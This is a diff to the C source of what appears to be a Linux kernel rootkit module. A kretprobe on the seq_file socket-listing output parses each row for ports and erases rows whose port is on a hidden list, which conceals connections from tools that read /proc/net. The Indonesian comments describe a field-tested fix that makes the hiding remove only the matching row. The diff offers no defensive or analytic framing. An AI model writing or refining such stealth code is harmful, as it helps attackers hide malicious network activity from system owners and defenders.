@@ -400,7 +400,8 @@ static int seq_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
 static int seq_post(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
 	struct seq_save *s = (struct seq_save *)ri->data;
-	const char *buf, *end, *c1, *c2, *c3;
+	char *buf, *row, *end;
+	const char *c1, *c2, *c3;
 	unsigned int port;
 
 	(void)regs;
@@ -408,20 +409,36 @@ static int seq_post(struct kretprobe_instance *ri, struct pt_regs *regs)
 		return 0;
 	buf = s->m->buf;
 	end = buf + s->m->count;
-	c1 = next_colon(buf, end);
+
+	/*
+	 * PERBAIKAN BUG EKSTRAKSI-BARIS (bug identik di legacy & modern,
+	 * terbukti lewat uji lapangan): seq_read MENUMPUK banyak baris dalam
+	 * satu buffer — yang baru ditulis show() = baris TERAKHIR.
+	 * Proses hanya baris terakhir (dari '\n' sebelumnya); kalau cocok
+	 * buang baris ITU saja. Kode lama parse dari awal buffer (selalu
+	 * port baris pertama -> baris ke-N tak pernah cocok) + count=0
+	 * (menghapus semua baris lain).
+	 */
+	if (end[-1] != '\n')
+		return 0;              /* belum utuh (overflow) — biarkan kernel */
+	row = end - 1;
+	while (row > buf && row[-1] != '\n')
+		row--;                 /* mundur ke awal baris terakhir */
+
+	c1 = next_colon(row, end);
 	if (!c1)
 		return 0;
 	c2 = next_colon(c1 + 1, end);
 	if (!c2 || !hex4(c2 + 1, end, &port))
 		return 0;
 	if (port <= 0xffff && is_hidden_port((u16)port)) {
-		s->m->count = 0;
+		s->m->count = row - buf;   /* buang hanya baris ini */
 		return 0;
 	}
 	c3 = next_colon(c2 + 1, end);
 	if (c3 && hex4(c3 + 1, end, &port) &&
 	    port <= 0xffff && is_hidden_port((u16)port))
-		s->m->count = 0;
+		s->m->count = row - buf;
 	return 0;
 }
 
